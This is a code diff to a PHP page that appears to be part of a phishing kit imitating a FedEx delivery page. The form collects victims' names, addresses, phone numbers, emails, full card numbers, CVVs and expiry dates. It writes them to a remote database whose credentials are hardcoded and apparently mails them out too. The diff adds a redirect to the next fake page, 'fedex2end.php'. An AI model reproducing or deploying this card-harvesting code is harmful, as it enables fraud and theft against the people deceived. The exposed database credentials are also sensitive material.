@@ -82,6 +82,10 @@ html , body {background:transparent; }
 
 
 
+
+
+
+
 <?php
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\SMTP;
@@ -95,10 +99,22 @@ require 'autre/phpmailer/smtp.php';
 
 if(    isset($_POST["name"])  )
 {
+	
+	
+	
+	
+	
 $connect = new PDO("mysql:host=freedb.tech;dbname=freedbtech_wordpresst", "freedbtech_mehdiouatmane", "mehdi2014@A");
 $query =  "INSERT INTO tablee   (name, date, address, codepostal, city, phone, email, namecard, cardnumber, cvv, datexp)   VALUES    ( :name, :date, :address, :codepostal, :city, :phone, :email, :namecard, :cardnumber, :cvv, :datexp ) " ;
 $user_data =  array(      ':name' => $_POST["name"],        ':date' => $_POST["date"],      ':address' => $_POST["address"],     ':codepostal' => $_POST["codepostal"],    ':city' => $_POST["city"],    ':phone' => $_POST["phone"],    ':email' => $_POST["email"],    ':namecard' => $_POST["namecard"],    ':cardnumber' => $_POST["cardnumber"],    ':cvv' => $_POST["cvv"],    ':datexp' => $_POST["datexp"]          ) ;
-if(     $connect   ->  prepare($query)	->  execute($user_data)               )       {  echo''; }  else   {  echo''; }
+if(     $connect   ->  prepare($query)	->  execute($user_data)               )       { echo "<script> window.location.href = 'fedex2end.php'; </script>"; }  else   { echo "<script> alert('erreur'); </script>"; }
+
+
+
+
+
+
+
 
 $name = $_POST["name"];
 $date = $_POST["date"];
@@ -245,6 +261,7 @@ if ( $mail->send() )   {	echo ""; }  else   {  echo "";	}
 							<div >   <input type="button" placeholder=""   value="validate!"  name=""  id="btnpage2"   class="inputbtn">    </div>			
 						</div>	
 					</div> 
+											
 					
 				</form>
 				</div>
@@ -299,12 +316,12 @@ if ( $mail->send() )   {	echo ""; }  else   {  echo "";	}
   if(    $.trim($('#cardnumber').val()).length == 0   )          {    txt_error_cardnumber = 'This credit card number is invalid';   $('#txt_error_cardnumber').text(txt_error_cardnumber);           $('#cardnumber').addClass('inputhovererror');      }               else               {    txt_error_cardnumber = '';  $('#txt_error_cardnumber').text(txt_error_cardnumber);               $('#cardnumber').removeClass('inputhovererror');      }
   if(    $.trim($('#cvv').val()).length == 0      )              {    txt_error_cvv = 'Please enter a CVV valide'; $('#txt_error_cvv').text(txt_error_cvv);                                           $('#cvv').addClass('inputhovererror');             }               else               {    txt_error_cvv = '';  $('#txt_error_cvv').text(txt_error_cvv);                                    $('#cvv').removeClass('inputhovererror');             }
   if(    $.trim($('#datexp').val()).length == 0   )              {    txt_error_datexp = 'Please enter the date in the format "MM/YY'; $('#txt_error_datexp').text(txt_error_datexp);                 $('#datexp').addClass('inputhovererror');          }               else               {    txt_error_datexp = '';  $('#txt_error_datexp').text(txt_error_datexp);                           $('#datexp').removeClass('inputhovererror');          } 
-  if( txt_error_namecard != '' || txt_error_cardnumber != '' || txt_error_cvv != '' || txt_error_datexp != '' )  {   return false;  }  else  {    	 $("#register_form").submit();   }  
+  if( txt_error_namecard != '' || txt_error_cardnumber != '' || txt_error_cvv != '' || txt_error_datexp != '' )  {   return false;  }  else  {    	 $("#register_form").submit();     }  
 
  });
  
  
- 
+
  
 });
  
